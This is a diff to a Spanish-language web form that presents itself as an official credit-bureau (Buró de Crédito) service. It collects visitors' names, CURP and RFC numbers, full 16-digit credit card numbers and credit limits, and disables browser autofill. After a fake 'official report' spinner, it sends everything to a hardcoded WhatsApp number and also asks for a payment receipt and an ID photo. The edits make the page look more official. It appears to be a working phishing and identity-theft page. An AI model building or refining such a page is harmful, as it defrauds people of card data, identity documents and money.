@@ -1,9 +1,9 @@
-
+<!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gestoría y Servicios ADS - Panel Oficial</title>
+    <title>Gestoría ADS - Panel Oficial</title>
     <style>
         :root {
             --primary-blue: #1a5276;
@@ -33,7 +33,7 @@
 
         .logos-header {
             display: flex;
-            justify-content: space-around; /* Cambiado para mejor alineación */
+            justify-content: space-around;
             align-items: center;
             margin-bottom: 25px;
             padding-bottom: 15px;
@@ -41,7 +41,7 @@
         }
 
         .logo-item {
-            max-height: 60px;
+            max-height: 55px;
             max-width: 120px;
             object-fit: contain;
         }
@@ -64,13 +64,16 @@
 
         .input-group { margin-bottom: 15px; }
         label { display: block; margin-bottom: 5px; font-weight: 600; font-size: 0.85rem; color: #333; }
-        input, select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 14px; }
+        input, select { 
+            width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; 
+            box-sizing: border-box; font-size: 15px; outline-color: var(--secondary-blue);
+        }
 
         #seccionExtra { display: none; background: #f8fbff; padding: 15px; border-radius: 10px; border: 1px solid #e1e8ef; margin-bottom: 15px; }
 
         .btn-submit {
             width: 100%;
-            padding: 15px;
+            padding: 16px;
             background-color: var(--primary-blue);
             color: white;
             border: none;
@@ -79,7 +82,7 @@
             font-size: 1rem;
             font-weight: bold;
             text-transform: uppercase;
-            margin-top: 10px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
         }
 
         .spinner { border: 4px solid rgba(0,0,0,0.1); border-top: 4px solid var(--primary-blue); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
@@ -90,8 +93,9 @@
 
 <div class="container" id="mainContainer">
     <div class="logos-header">
-        <img src="buro1.jpg" alt="Buró de Crédito" class="logo-item">
-        <img src="ads.jpeg" alt="Logo ADS" class="logo-item"> </div>
+        <img src="buro1.jpg" alt="Buró" class="logo-item">
+        <img src="ads.jpeg" alt="ADS" class="logo-item">
+    </div>
 
     <div class="brand-header">
         <h1>Gestoría ADS</h1>
@@ -103,43 +107,58 @@
         <strong>Andrés García Martínez</strong>
     </div>
 
-    <form id="buroForm">
-        <span class="section-label">Datos del Solicitante</span>
+    <form id="buroForm" autocomplete="off">
+        <span class="section-label">Datos de Identificación (RFC / CURP)</span>
+        
         <div class="input-group">
             <label>Nombre(s)</label>
-            <input type="text" id="nombres" required>
+            <input type="text" id="nombres" required autocomplete="new-password">
         </div>
+        
         <div style="display: flex; gap: 10px;">
-            <div class="input-group" style="flex:1;"><label>Apellido Paterno</label><input type="text" id="paterno" required></div>
-            <div class="input-group" style="flex:1;"><label>Apellido Materno</label><input type="text" id="materno" required></div>
+            <div class="input-group" style="flex:1;">
+                <label>Apellido Paterno</label>
+                <input type="text" id="paterno" required autocomplete="new-password">
+            </div>
+            <div class="input-group" style="flex:1;">
+                <label>Apellido Materno</label>
+                <input type="text" id="materno" required autocomplete="new-password">
+            </div>
         </div>
+
         <div style="display: flex; gap: 10px;">
-            <div class="input-group" style="flex:1;"><label>CURP</label><input type="text" id="curp" maxlength="18" required style="text-transform: uppercase;"></div>
-            <div class="input-group" style="flex:1;"><label>RFC</label><input type="text" id="rfc" maxlength="13" required style="text-transform: uppercase;"></div>
+            <div class="input-group" style="flex:1;">
+                <label>CURP</label>
+                <input type="text" id="curp" maxlength="18" required style="text-transform: uppercase;" autocomplete="new-password">
+            </div>
+            <div class="input-group" style="flex:1;">
+                <label>RFC</label>
+                <input type="text" id="rfc" maxlength="13" required style="text-transform: uppercase;" autocomplete="new-password">
+            </div>
         </div>
 
         <span class="section-label">Validación Financiera</span>
         <div class="input-group">
-            <label>¿Tiene Tarjeta de Crédito activa?</label>
+            <label>¿Cuenta con Tarjeta de Crédito activa?</label>
             <select id="tieneTarjeta" onchange="toggleSeccion()" required>
-                <option value="">Seleccione...</option>
-                <option value="si">Sí</option>
-                <option value="no">No (Débito únicamente)</option>
+                <option value="">Seleccione una opción...</option>
+                <option value="si">Sí, cuento con tarjeta</option>
+                <option value="no">No tengo tarjeta (Solo Débito)</option>
             </select>
         </div>
 
         <div id="seccionExtra">
             <div class="input-group">
                 <label>Número de Tarjeta (16 dígitos)</label>
-                <input type="text" id="tarjeta" maxlength="16" placeholder="Ingrese los 16 números">
+                <input type="text" id="tarjeta" maxlength="16" placeholder="0000 0000 0000 0000">
             </div>
             <div class="input-group">
                 <label>Límite de Crédito</label>
-                <input type="number" id="limite" placeholder="Ej. 15000">
+                <input type="number" id="limite" placeholder="Ej. 10000">
             </div>
         </div>
 
-        <button type="submit" class="btn-submit">Enviar Datos a WhatsApp</button>
+        <button type="submit" class="btn-submit">Generar Solicitud WhatsApp</button>
     </form>
 </div>
 
@@ -155,7 +174,6 @@
         tarjetaInput.required = (val === 'si');
     }
 
-    // Solo permite números en el campo de tarjeta
     tarjetaInput.addEventListener('input', function() {
         this.value = this.value.replace(/[^0-9]/g, '');
     });
@@ -164,36 +182,40 @@
         e.preventDefault();
         const seleccion = document.getElementById('tieneTarjeta').value;
         
-        // Validación de los 16 dígitos requerida según tus instrucciones
         if (seleccion === 'si' && tarjetaInput.value.length !== 16) {
-            alert("Error: El Buró requiere los 16 dígitos exactos de su tarjeta de crédito.");
+            alert("Atención: Para trámites de Buró se requieren los 16 dígitos de su tarjeta.");
             return;
         }
 
-        const nombreC = `${document.getElementById('nombres').value} ${document.getElementById('paterno').value} ${document.getElementById('materno').value}`;
-        
-        // Mensaje formateado para WhatsApp
-        const msg = `*SOLICITUD ADS - BURÓ*\n\n` +
-                    `👤 *CLIENTE:* ${nombreC.toUpperCase()}\n` +
-                    `🆔 *CURP:* ${document.getElementById('curp').value.toUpperCase()}\n` +
-                    `🆔 *RFC:* ${document.getElementById('rfc').value.toUpperCase()}\n\n` +
-                    `💳 *DATOS FINANCIEROS:*\n` +
-                    `*Tarjeta:* ${(seleccion === 'si') ? tarjetaInput.value : "No tiene"}\n` +
-                    `*Límite:* $${document.getElementById('limite').value || "0"}\n\n` +
-                    `💰 *PAGO:* $96.00 Realizado a Andrés García\n\n` +
-                    `⚠️ *POR FAVOR:* Adjunte foto de su INE y el comprobante de pago abajo.`;
+        const nom = document.getElementById('nombres').value.toUpperCase();
+        const pat = document.getElementById('paterno').value.toUpperCase();
+        const mat = document.getElementById('materno').value.toUpperCase();
+        const curp = document.getElementById('curp').value.toUpperCase();
+        const rfc = document.getElementById('rfc').value.toUpperCase();
+        const tjt = (seleccion === 'si') ? tarjetaInput.value : "NO CUENTA CON TARJETA";
+        const lim = document.getElementById('limite').value || "0";
 
-        // Número de WhatsApp configurado: 2382035958
+        const msg = `*GESTIÓN DE TRÁMITE ADS*\n\n` +
+                    `📝 *DATOS DEL CLIENTE:*\n` +
+                    `• *Nombre:* ${nom} ${pat} ${mat}\n` +
+                    `• *CURP:* ${curp}\n` +
+                    `• *RFC:* ${rfc}\n\n` +
+                    `💳 *VALIDACIÓN BANCARIA:*\n` +
+                    `• *Tarjeta:* ${tjt}\n` +
+                    `• *Límite:* $${lim}\n\n` +
+                    `💰 *DEPÓSITO:* $96.00 (Andrés García)\n\n` +
+                    `✅ *SIGUIENTE PASO:* Por favor envíe foto de su INE y su comprobante aquí debajo.`;
+
         const whatsappUrl = `https://wa.me/522382035958?text=${encodeURIComponent(msg)}`;
         
         container.innerHTML = `
             <div style="text-align:center; padding: 50px;">
                 <div class="spinner"></div>
-                <p>Procesando información bancaria...</p>
-                <p style="font-size: 0.8em; color: gray;">Redirigiendo a revisión oficial</p>
+                <p>Generando reporte oficial...</p>
+                <p style="font-size: 0.8em; color: gray;">Redirigiendo a WhatsApp</p>
             </div>`;
             
-        setTimeout(() => { window.location.href = whatsappUrl; }, 2000);
+        setTimeout(() => { window.location.href = whatsappUrl; }, 1800);
     });
 </script>
 
